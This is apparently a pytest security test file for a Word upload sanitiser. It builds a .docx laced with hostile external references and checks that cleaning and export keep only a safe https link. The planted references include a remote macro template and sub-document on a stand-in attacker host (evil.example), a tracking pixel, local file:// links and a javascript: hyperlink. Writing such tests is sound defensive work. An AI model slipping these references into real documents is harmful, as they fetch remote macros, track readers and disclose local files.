"""What a Word file points to outside itself (tracker SEC-016). The file is kept as the
document's original and every Word export is written into it, so it keeps no external
target but links a link may have: a remote template, a linked picture, a sub-document, a
mail-merge data source and its query go, with what referred to them; a link to an address
a link may not have keeps its text. Never opened in Word as it is uploaded here -- Word
would fetch what it points to."""

import io
import re
import zipfile

import pytest
from docx import Document as DocxDocument
from fastapi.testclient import TestClient
from PIL import Image as PILImage

from app.ai.base import AIStructuredOutputError
from app.ai.factory import get_ai_provider
from app.export.package_check import package_problems
from app.main import app
from app.parsers.docx_inline import UNSAFE_LINKS_NOTE
from app.security.package import Cleaned, clean_package
from app.services.ingestion_service import UNSAFE_EXTERNAL
from tests.fakes import FakeAIProvider

pytestmark = pytest.mark.security

client = TestClient(app, base_url="https://testserver")
_DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
_W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
_RNS = 'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
_REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"


@pytest.fixture
def signed_in(api_db):
    client.cookies.clear()
    app.dependency_overrides[get_ai_provider] = lambda: FakeAIProvider([AIStructuredOutputError("no AI in tests")] * 3)
    assert client.post("/api/v1/auth/register", json={"email": "external@example.com", "password": "long enough password"}).status_code == 201
    yield
    client.cookies.clear()
    app.dependency_overrides.pop(get_ai_provider, None)


def _rel(rel_id: str, kind: str, target: str) -> bytes:
    return f'<Relationship Id="{rel_id}" Type="{_REL}/{kind}" Target="{target}" TargetMode="External"/>'.encode()


def _add_rels(rels: bytes, *added: bytes) -> bytes:
    return rels.replace(b"</Relationships>", b"".join(added) + b"</Relationships>")


def _word_file() -> bytes:
    doc = DocxDocument()
    doc.add_paragraph("Before the links.")
    picture = io.BytesIO()
    PILImage.new("RGB", (4, 3), (200, 40, 40)).save(picture, format="PNG")
    doc.add_picture(picture)
    doc.sections[0].header.paragraphs[0].text = ""
    buffer = io.BytesIO()
    doc.save(buffer)
    with zipfile.ZipFile(io.BytesIO(buffer.getvalue())) as package:
        parts = {name: package.read(name) for name in package.namelist()}

    body = parts["word/document.xml"]
    links = (
        f'<w:p {_W} {_RNS}><w:hyperlink r:id="rIdBad"><w:r><w:t>local file</w:t></w:r></w:hyperlink>'
        f'<w:r><w:t xml:space="preserve"> and </w:t></w:r><w:hyperlink r:id="rIdGood"><w:r><w:t>site</w:t></w:r></w:hyperlink></w:p>'
        f'<w:p {_W} {_RNS}><w:subDoc r:id="rIdSub"/></w:p>'
    ).encode()
    body = body.replace(b"<w:sectPr", links + b"<w:sectPr", 1)
    body = re.sub(rb"(<a:blip [^>]*r:embed=\"[^\"]+\")", rb'\1 r:link="rIdPic"', body, count=1)
    parts["word/document.xml"] = body
    parts["word/_rels/document.xml.rels"] = _add_rels(
        parts["word/_rels/document.xml.rels"],
        _rel("rIdBad", "hyperlink", "file:///C:/secret/local.txt"),
        _rel("rIdGood", "hyperlink", "https://example.com/docs"),
        _rel("rIdPic", "image", "http://tracker.example/pixel.png"),
        _rel("rIdSub", "subDocument", "http://evil.example/sub.docx"),
    )
    header_name = next(name for name in parts if re.fullmatch(r"word/header\d+\.xml", name))
    parts[header_name] = parts[header_name].replace(
        b"</w:p>", f'<w:hyperlink {_RNS} r:id="rIdJs"><w:r><w:t>header link</w:t></w:r></w:hyperlink></w:p>'.encode(), 1
    )
    header_rels = f"word/_rels/{header_name.split('/')[-1]}.rels"
    parts[header_rels] = _add_rels(parts.get(header_rels, b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>'), _rel("rIdJs", "hyperlink", "javascript:alert(1)"))

    merge = (
        f'<w:attachedTemplate {_RNS} r:id="rIdTpl"/>'
        f'<w:mailMerge {_RNS}><w:mainDocumentType w:val="formLetters"/><w:dataType w:val="native"/>'
        '<w:connectString w:val="Provider=Microsoft.ACE.OLEDB.12.0;Data Source=C:\\data.xlsx"/>'
        '<w:query w:val="SELECT * FROM `Sheet1$`"/><w:dataSource r:id="rIdData"/></w:mailMerge>'
    ).encode()
    parts["word/settings.xml"] = re.sub(rb"(<w:settings[^>]*>)", lambda match: match.group(1) + merge, parts["word/settings.xml"], count=1)
    parts["word/_rels/settings.xml.rels"] = _add_rels(
        parts.get("word/_rels/settings.xml.rels", b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>'),
        _rel("rIdTpl", "attachedTemplate", "http://evil.example/macros.dotm"),
        _rel("rIdData", "mailMergeSource", "file:///C:/data.xlsx"),
    )
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as package:
        for name, content in parts.items():
            package.writestr(name, content)
    return out.getvalue()


def _external_targets(data: bytes) -> list[str]:
    with zipfile.ZipFile(io.BytesIO(data)) as package:
        rels = [package.read(name) for name in package.namelist() if name.endswith(".rels")]
    return sorted(target.decode() for content in rels for target in re.findall(rb'Target="([^"]*)"[^>]*TargetMode="External"', content))


def _read(data: bytes, name: str) -> str:
    return zipfile.ZipFile(io.BytesIO(data)).read(name).decode("utf-8")


def test_a_word_file_keeps_no_external_target_but_safe_links():
    source = _word_file()
    assert _external_targets(source) == sorted(
        ["file:///C:/secret/local.txt", "https://example.com/docs", "http://tracker.example/pixel.png", "http://evil.example/sub.docx",
         "javascript:alert(1)", "http://evil.example/macros.dotm", "file:///C:/data.xlsx"]
    )

    cleaned = clean_package(source)

    assert (cleaned.fields, cleaned.links, cleaned.external) == (0, 2, 5)  # 4 targets and the mail merge's query
    assert _external_targets(cleaned.data) == ["https://example.com/docs"]
    settings, body = _read(cleaned.data, "word/settings.xml"), _read(cleaned.data, "word/document.xml")
    assert "attachedTemplate" not in settings and "mailMerge" not in settings and "SELECT" not in settings
    assert "r:link" not in body and "subDoc" not in body and "r:embed" in body  # the picture itself stays
    assert "local file" in body and 'r:id="rIdGood"' in body and 'r:id="rIdBad"' not in body
    header = next(name for name in zipfile.ZipFile(io.BytesIO(cleaned.data)).namelist() if re.fullmatch(r"word/header\d+\.xml", name))
    assert "header link" in _read(cleaned.data, header) and "rIdJs" not in _read(cleaned.data, header)
    assert package_problems(cleaned.data) == []
    assert clean_package(cleaned.data) == Cleaned(cleaned.data)


def test_an_upload_says_so_and_no_word_export_points_outside_it(signed_in):
    response = client.post("/api/v1/documents/upload", files={"file": ("external.docx", _word_file(), _DOCX)})
    assert response.status_code == 201, response.text[:300]
    document = response.json()
    items = {item["feature"]: item for item in document["importReport"]["items"]}
    assert (items["docx.link.unsafe"]["count"], items["docx.external.unsafe"]["count"]) == (2, 5)
    assert UNSAFE_LINKS_NOTE in document["unsupportedFeatures"] and UNSAFE_EXTERNAL in document["unsupportedFeatures"]
    assert any(element["content"] == "local file and site" for element in document["elements"])

    exported = client.get(f"/api/v1/documents/{document['id']}/export/docx")
    assert exported.status_code == 200
    assert _external_targets(exported.content) == ["https://example.com/docs"]
    assert "attachedTemplate" not in _read(exported.content, "word/settings.xml")
    assert package_problems(exported.content) == []
